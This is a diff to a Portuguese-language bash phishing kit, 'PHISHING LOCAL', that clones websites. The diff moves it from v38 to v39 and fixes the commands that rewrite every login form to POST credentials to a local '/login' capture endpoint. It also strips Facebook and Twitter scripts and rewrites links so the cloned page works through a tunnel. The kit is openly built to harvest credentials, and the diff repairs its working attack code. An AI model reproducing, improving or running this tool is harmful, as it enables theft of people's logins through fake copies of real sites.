@@ -1,6 +1,6 @@
 #!/bin/bash
 # ============================================
-# 🎣 PHISHING LOCAL v38 - Clonador Profissional
+# 🎣 PHISHING LOCAL v39 - Clonador Profissional
 # 1 Phish 2 Capturas 3 Túnel 4 Histórico 5 Localhost 6 Link 7 Status 8 Parar 9 Proxy 0 Sair
 # ============================================
 
@@ -252,7 +252,7 @@ ENDSPA
     local js_count=0
     local js_list_file="$SCRIPT_DIR/.js_list"
     grep -oE 'src="[^"]*\.js[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//' > "$js_list_file"
-    grep -oE 'src="//[^"]*\.js[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//|https://|' >> "$js_list_file"
+    grep -oE 'src="//[^"]*\.js[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's|src="//|https://|' >> "$js_list_file"
     sort -u "$js_list_file" -o "$js_list_file"
     while IFS= read -r js_url; do
         [ -z "$js_url" ] && continue
@@ -272,8 +272,8 @@ ENDSPA
 
     # 4. Captura + substituição
     echo -e "${YELLOW}[4/6] Configurando captura...${NC}"
-    sed -i 's/action="[^"]*"/action="\\/login"/gI' "$SITE_DIR/index.html"
-    sed -i 's/<form\b/<form method="POST" action="\/login"/gI' "$SITE_DIR/index.html"
+    perl -i -pe 's|action="[^"]*"|action="/login"|gi' "$SITE_DIR/index.html"
+    perl -i -pe 's|<form\b|<form method="POST" action="/login"|gi' "$SITE_DIR/index.html"
 
     local domain_plain=$(echo "$base_domain" | sed 's|https\?://||')
     local domain_www="www.${domain_plain}"
@@ -325,9 +325,9 @@ ENDSPA
         done
     done
     perl -i -pe "s|\Q${placeholder}\E|${local_url}|g" "$SITE_DIR/index.html"
-    perl -i -pe 's|<script[^>]*src="https?://connect\.facebook\.net[^"]*"[^>]*></script>||gI' "$SITE_DIR/index.html"
-    perl -i -pe 's|<script[^>]*src="https?://platform\.twitter\.com[^"]*"[^>]*></script>||gI' "$SITE_DIR/index.html"
-    perl -i -pe "s|http://\Q${my_ip}\E|${local_url}|gI" "$SITE_DIR/index.html"
+    perl -i -pe 's|<script[^>]*src="https?://connect\.facebook\.net[^"]*"[^>]*></script>||gi' "$SITE_DIR/index.html"
+    perl -i -pe 's|<script[^>]*src="https?://platform\.twitter\.com[^"]*"[^>]*></script>||gi' "$SITE_DIR/index.html"
+    perl -i -pe "s|http://\Q${my_ip}\E|${local_url}|gi" "$SITE_DIR/index.html"
 
     # Verificar links externos restantes
     local ext_count=$(grep -oE '(src|href)="https?://[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | grep -v 'localhost\|127\.0\.0\.1' | wc -l | tr -d ' ')
@@ -821,7 +821,7 @@ while true; do
     echo -e "  ██║     ██║  ██║██║███████║██║  ██║"
     echo -e "  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝"
     echo ""
-    echo -e "  🎣 PHISHING LOCAL ${CYAN}v38${NC}"
+    echo -e "  🎣 PHISHING LOCAL ${CYAN}v39${NC}"
     echo ""
     echo "  ─────────────────────────────────────────"
     echo ""
